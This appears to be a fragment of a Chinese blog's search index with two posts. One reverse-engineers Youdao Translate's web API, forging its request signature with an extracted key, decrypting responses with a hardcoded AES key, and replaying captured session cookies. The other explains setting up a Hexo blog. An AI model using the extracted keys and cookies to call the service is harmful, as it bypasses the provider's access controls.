function_">getTime</span>();<br><br>    test = <span class="hljs-string">`client=fanyideskweb&amp;mysticTime=<span class="hljs-subst">$&#123;a&#125;</span>&amp;product=webfanyi&amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3`</span><br>    sign = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(test).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> [a, sign]<br><br>&#125;<br><span class="hljs-comment">//console.log(getsign());</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">translate_response</span>(<span class="hljs-params">text</span>) &#123;<br>    <span class="hljs-comment">// text 是 base64 字符串</span><br>    <span class="hljs-keyword">const</span> key = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">8</span>, <span class="hljs-number">20</span>, <span class="hljs-number">157</span>, <span class="hljs-number">167</span>, <span class="hljs-number">60</span>, <span class="hljs-number">89</span>, <span class="hljs-number">206</span>, <span class="hljs-number">98</span>, <span class="hljs-number">85</span>, <span class="hljs-number">91</span>, <span class="hljs-number">1</span>, <span class="hljs-number">233</span>, <span class="hljs-number">47</span>, <span class="hljs-number">52</span>, <span class="hljs-number">232</span>, <span class="hljs-number">56</span>]);<br>    <span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">210</span>, <span class="hljs-number">187</span>, <span class="hljs-number">27</span>, <span class="hljs-number">253</span>, <span class="hljs-number">232</span>, <span class="hljs-number">59</span>, <span class="hljs-number">56</span>, <span class="hljs-number">195</span>, <span class="hljs-number">68</span>, <span class="hljs-number">54</span>, <span class="hljs-number">99</span>, <span class="hljs-number">87</span>, <span class="hljs-number">183</span>, <span class="hljs-number">156</span>, <span class="hljs-number">174</span>, <span class="hljs-number">28</span>]);<br>    <span class="hljs-keyword">const</span> decipher = crypto.<span class="hljs-title function_">createDecipheriv</span>(<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>, key, iv);<br>    <span class="hljs-keyword">let</span> decrypted = decipher.<span class="hljs-title function_">update</span>(text, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    decrypted += decipher.<span class="hljs-title function_">final</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(decrypted);<br>&#125;<br><br><span class="hljs-comment">//arg = &#x27;Z21kD9ZK1ke6ugku2ccWu4n6eLnvoDT0YgGi0y3g-v0B9sYqg8L9D6UERNozYOHqnYdl2efZNyM6Trc_xS-zKtfTK4hb6JP8XwCzNh0avc8qItQUiIU_4wKKXJlIpvMvfKvJaaZzaX6VEtpkr2FdkfoT_Jgbm2GRSVj3r40autIdlImENG8hC0ZH4ww7utwuTt3Oo_ZpXg0BSq9wePSAB75-ChkiGKF9HTIPeCl2bl84SBD1XDfFCZpkKQhecYSs0JLoXOqP2ltavxRrg58Hp1q5uIgZZ_Oo2-Jmd-t1r4es40drcAq5bjmS62M2VJF8D6ojtOh9JTfNwgzD3CxYn-Pd7-TgHMyNEJEkFXTAyxzpjlFqtrCYDE3SZUYlENkqsL8Wrra1hM-1nTfiB-BLcWAdRBynNpP5_54aq_-GBsq8bB_9yEX5ovzDB4_Ry_spVVuUnb39iplMHCdCnjOD3ngiIDbl9SUz-9npjBX05ZYRdPmFPAl424qdoaxeVqnVoH8jQFPZVqaHMzu4mJg0SICDWFH7GP1zqGRbXd3ESjT_iBInl3gICt2XVuhh_nubcELkTEC6xbqEDRQkPUNMpzXJHjcvsLHtcmSW0S9F0445ho9kT2qZYdMBC3Fs0OaHpUtFu77gZpQn7sGiqh8VliXIcUtfvvop-1c-Vu5QjfUbLn2-s5POR9fGYG6rt6ioe_PGmwWj-Cc00zUM7FybfarKTr4D3Rk57R72qpXN4Ja86ZsCAMmDG-m5z31RQh_V7echJ8Kna3Go3yWKCK4vtSwOWrFhiS5RTz6EkrGc3SkFKbb5vp8Wop_84myBtgnBmj4CczhTq2HcOxrJf4def6yDt2uBxyv4bTVGx9Yx3uB4Gx0iK5kYvfma6B_LnkRWk331wjuXKQtBGYIuWkR8J5QtvBmIRVaa7AA19Z4xMIEAqbcuQ5p4I9FCElthBrJdtEr4l29PhwKfsA7pYeU2EJLRrRK42WQpEy0Xwx_2Lz2e3Rlf-L467aRO7RmuvBXD-J_H0IwaArTP7K3_ZeSUzEvCicixstp94kzkLHCsyJHZXiR3YTq3t7lmNgpfDbb-&#x27;</span><br><span class="hljs-comment">//console.log(translate_response(&#x27;Z21kD9ZK1ke6ugku2ccWu4n6eLnvoDT0YgGi0y3g-v0B9sYqg8L9D6UERNozYOHqnYdl2efZNyM6Trc_xS-zKtfTK4hb6JP8XwCzNh0avc8qItQUiIU_4wKKXJlIpvMvfKvJaaZzaX6VEtpkr2FdkfoT_Jgbm2GRSVj3r40autIdlImENG8hC0ZH4ww7utwuTt3Oo_ZpXg0BSq9wePSAB75-ChkiGKF9HTIPeCl2bl84SBD1XDfFCZpkKQhecYSs0JLoXOqP2ltavxRrg58Hp1q5uIgZZ_Oo2-Jmd-t1r4es40drcAq5bjmS62M2VJF8D6ojtOh9JTfNwgzD3CxYn-Pd7-TgHMyNEJEkFXTAyxzpjlFqtrCYDE3SZUYlENkqsL8Wrra1hM-1nTfiB-BLcWAdRBynNpP5_54aq_-GBsq8bB_9yEX5ovzDB4_Ry_spVVuUnb39iplMHCdCnjOD3ngiIDbl9SUz-9npjBX05ZYRdPmFPAl424qdoaxeVqnVoH8jQFPZVqaHMzu4mJg0SICDWFH7GP1zqGRbXd3ESjT_iBInl3gICt2XVuhh_nubcELkTEC6xbqEDRQkPUNMpzXJHjcvsLHtcmSW0S9F0445ho9kT2qZYdMBC3Fs0OaHpUtFu77gZpQn7sGiqh8VliXIcUtfvvop-1c-Vu5QjfUbLn2-s5POR9fGYG6rt6ioe_PGmwWj-Cc00zUM7FybfarKTr4D3Rk57R72qpXN4Ja86ZsCAMmDG-m5z31RQh_V7echJ8Kna3Go3yWKCK4vtSwOWrFhiS5RTz6EkrGc3SkFKbb5vp8Wop_84myBtgnBmj4CczhTq2HcOxrJf4def6yDt2uBxyv4bTVGx9Yx3uB4Gx0iK5kYvfma6B_LnkRWk331wjuXKQtBGYIuWkR8J5QtvBmIRVaa7AA19Z4xMIEAqbcuQ5p4I9FCElthBrJdtEr4l29PhwKfsA7pYeU2EJLRrRK42WQpEy0Xwx_2Lz2e3Rlf-L467aRO7RmuvBXD-J_H0IwaArTP7K3_ZeSUzEvCicixstp94kzkLHCsyJHZXiR3YTq3t7lmNgpfDbb-&#x27;));</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> execjs<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><br><br><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;OUTFOX_SEARCH_USER_ID&#x27;</span>: <span class="hljs-string">&#x27;-39140274@218.106.117.234&#x27;</span>,<br>    <span class="hljs-string">&#x27;OUTFOX_SEARCH_USER_ID_NCOO&#x27;</span>: <span class="hljs-string">&#x27;1017813054.5103312&#x27;</span>,<br>    <span class="hljs-string">&#x27;DICT_DOCTRANS_SESSION_ID&#x27;</span>: <span class="hljs-string">&#x27;NGI5MmMzZTktYmY5ZS00Njg1LTkwODMtODZlZjI2OTA5YzZh&#x27;</span>,<br>    <span class="hljs-string">&#x27;_uetsid&#x27;</span>: <span class="hljs-string">&#x27;b1a3a4202e6211f09ed8910f851b0f84&#x27;</span>,<br>    <span class="hljs-string">&#x27;_uetvid&#x27;</span>: <span class="hljs-string">&#x27;0a3206b0b5e211ef97071f44ad9eeb40&#x27;</span>,<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ar;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;https://fanyi.youdao.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://fanyi.youdao.com/&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-site&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua&#x27;</span>: <span class="hljs-string">&#x27;&quot;Chromium&quot;;v=&quot;136&quot;, &quot;Microsoft Edge&quot;;v=&quot;136&quot;, &quot;Not.A/Brand&quot;;v=&quot;99&quot;&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="hljs-string">&#x27;?0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="hljs-string">&#x27;&quot;Windows&quot;&#x27;</span>,<br>    <span class="hljs-comment"># &#x27;Cookie&#x27;: &#x27;OUTFOX_SEARCH_USER_ID=-39140274@218.106.117.234; OUTFOX_SEARCH_USER_ID_NCOO=1017813054.5103312; DICT_DOCTRANS_SESSION_ID=NGI5MmMzZTktYmY5ZS00Njg1LTkwODMtODZlZjI2OTA5YzZh; _uetsid=b1a3a4202e6211f09ed8910f851b0f84; _uetvid=0a3206b0b5e211ef97071f44ad9eeb40&#x27;,</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">youdao</span>(<span class="hljs-params">txt</span>):<br>    jscode = execjs.<span class="hljs-built_in">compile</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;translate.js&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read())  <span class="hljs-comment">#导入刚才写的js文件</span><br>    time_now,sign = jscode.call(<span class="hljs-string">&quot;getsign&quot;</span>)                                  <span class="hljs-comment">#调用js文件中的方法,得到time_now和sign</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;i&#x27;</span>: txt,<br>        <span class="hljs-string">&#x27;from&#x27;</span>: <span class="hljs-string">&#x27;zh-CHS&#x27;</span>,<br>        <span class="hljs-string">&#x27;to&#x27;</span>: <span class="hljs-string">&#x27;en&#x27;</span>,<br>        <span class="hljs-string">&#x27;useTerm&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>        <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;dictResult&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>        <span class="hljs-string">&#x27;keyid&#x27;</span>: <span class="hljs-string">&#x27;webfanyi&#x27;</span>,<br>        <span class="hljs-string">&#x27;sign&#x27;</span>: sign,<br>        <span class="hljs-string">&#x27;client&#x27;</span>: <span class="hljs-string">&#x27;fanyideskweb&#x27;</span>,<br>        <span class="hljs-string">&#x27;product&#x27;</span>: <span class="hljs-string">&#x27;webfanyi&#x27;</span>,<br>        <span class="hljs-string">&#x27;appVersion&#x27;</span>: <span class="hljs-string">&#x27;1.0.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;vendor&#x27;</span>: <span class="hljs-string">&#x27;web&#x27;</span>,<br>        <span class="hljs-string">&#x27;pointParam&#x27;</span>: <span class="hljs-string">&#x27;client,mysticTime,product&#x27;</span>,<br>        <span class="hljs-string">&#x27;mysticTime&#x27;</span>: time_now,<br>        <span class="hljs-string">&#x27;keyfrom&#x27;</span>: <span class="hljs-string">&#x27;fanyi.web&#x27;</span>,<br>        <span class="hljs-string">&#x27;mid&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;screen&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;model&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;network&#x27;</span>: <span class="hljs-string">&#x27;wifi&#x27;</span>,<br>        <span class="hljs-string">&#x27;abtest&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;yduuid&#x27;</span>: <span class="hljs-string">&#x27;abcdefg&#x27;</span>,<br>    &#125;<br>    response = requests.post(<span class="hljs-string">&#x27;https://dict.youdao.com/webtranslate&#x27;</span>, <br>                             cookies=cookies, <br>                             headers=headers, <br>                             data=data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).text<br>    <span class="hljs-comment">#print(response)</span><br><br>    result = jscode.call(<span class="hljs-string">&#x27;translate_response&#x27;</span>,response)<br>    <span class="hljs-comment">#print(result)</span><br>    translate = result[<span class="hljs-string">&#x27;translateResult&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;tgt&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;翻译结果为：<span class="hljs-subst">&#123;translate&#125;</span>&#x27;</span>)<br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    txt = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入要翻译的内容：&#x27;</span>)<br>    youdao(txt)<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>js逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建个人博客</title>
    <link href="/2025/05/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2025/05/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="工具：Cloudflare-GitHub-Hexo-Fluid"><a href="#工具：Cloudflare-GitHub-Hexo-Fluid" class="headerlink" title="工具：Cloudflare+GitHub+Hexo Fluid"></a>工具：Cloudflare+GitHub+Hexo Fluid</h1><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>hexo 是一个快速、简洁，而且功能强大的静态博客框架。我们可以使用 Markdown 编写博客文章，然后 hexo 帮我们把 Markdown 文件渲染成静态 HTML 页面。因此 hexo 非常适合用来搭建技术类博客，以及项目文档和个人网站。</p><p>需要安装node.js依赖</p><h2 id="github托管"><a href="#github托管" class="headerlink" title="github托管"></a>github托管</h2><p>将博客项目托管到github仓库，并使用Github pages来部署博客，可以让其他人也访问该博客。</p><h2 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h2><p>使用cloudflare加速国内用户访问速度。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dash.cloudflare.com<span class="hljs-regexp">/062413ad293e022e2f66f461b1a256f6/</span>pages<span class="hljs-regexp">/view/</span>jimi-lab-github-io<br></code></pre></td></tr></table></figure><h2 id="修改Hexo主题"><a href="#修改Hexo主题" class="headerlink" title="修改Hexo主题"></a>修改Hexo主题</h2><p>我选择Fluid主题，再加一些个性化的设计，大家可以自行选择。</p><h2 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h2><p>使用github utterances插件</p><h2 id="md中添加截图"><a href="#md中添加截图" class="headerlink" title="md中添加截图"></a>md中添加截图</h2><p>cursor中使用了Paste Image插件。<br>F1截图之后，Ctrl+Alt+V,直接粘贴到特定目录，并在当前md文档中引用该图片。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="发布新文章"><a href="#发布新文章" class="headerlink" title="发布新文章"></a>发布新文章</h2><p>1.在Hexo项目根目录下使用命令：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;Hello World&quot;</span><br></code></pre></td></tr></table></figure><p>使用该命令会在文件中自动生成文件头。<br>2.这样会在 source&#x2F;_posts&#x2F; 目录下自动生成一个 Hello-World.md 的新文章文件。你只需要编辑这个 Markdown 文件，写入你的内容即可。</p><h4 id="将语雀文档同步到个人博客："><a href="#将语雀文档同步到个人博客：" class="headerlink" title="将语雀文档同步到个人博客："></a>将语雀文档同步到个人博客：</h4><p>1.将语雀文章以md格式导出。<br>2.将导出的文件复制粘贴进Hello-World.md文件（直接将导出的文件拖入source&#x2F;_posts&#x2F; 目录也可以）<br>3.运行：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">R:\MyProject\MyBlog\my-blog&gt;<span class="hljs-keyword">python</span> yuque.<span class="hljs-keyword">py</span> Hello-World.md<br></code></pre></td></tr></table></figure><p>（这条命令会将Hello-World.md中的cdn链接转储到本地source&#x2F;img&#x2F;Hello-World目录下并在Hello-World.md更改引用本地图片）</p><p>运行以下命令可在本地查看编辑效果。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>3.完成内容创作之后，运行：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo clean &amp;&amp; hexo <span class="hljs-keyword">generate</span> &amp;&amp; hexo deploy<br></code></pre></td></tr></table></figure><p>该命令会将本地的仓库的内容同步到GitHub。</p><hr><p>最终URL：<br>github：<a href="https://jimi-lab.github.io/">https://jimi-lab.github.io/</a><br>cloudflare：<a href="https://jimi-lab-github-io.pages.dev/">https://jimi-lab-github-io.pages.dev/</a></p><p>最终效果图如下：<br><img src = "/img/搭建个人博客/background.png"></p><p><strong>报错信息汇总</strong>：</p><p>1.如果遇到以下错误：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Please make sure you have the correct access rights<br>and the repository exists.<br>FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html<br><span class="hljs-keyword">Error: </span>Spawn failed<br>    at ChildProcess.&lt;anonymous&gt; (R:\MyProject\MyBlog\my-blog\node_modules\hexo-deployer-git\node_modules\hexo-util\lib\spawn.js:51:21)<br>    at ChildProcess.emit (node:events:524:28)<br>    at cp.emit (R:\MyProject\MyBlog\my-blog\node_modules\cross-spawn\lib\enoent.js:34:29)<br>    at ChildProcess._handle.onexit (node:internal/child_process:293:12)<br></code></pre></td></tr></table></figure><p>可能是因为ssh连接github时候连接不上报错，可以尝试打开代理&#x2F;电脑使用自己手机热点&#x2F;等方法解决。</p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
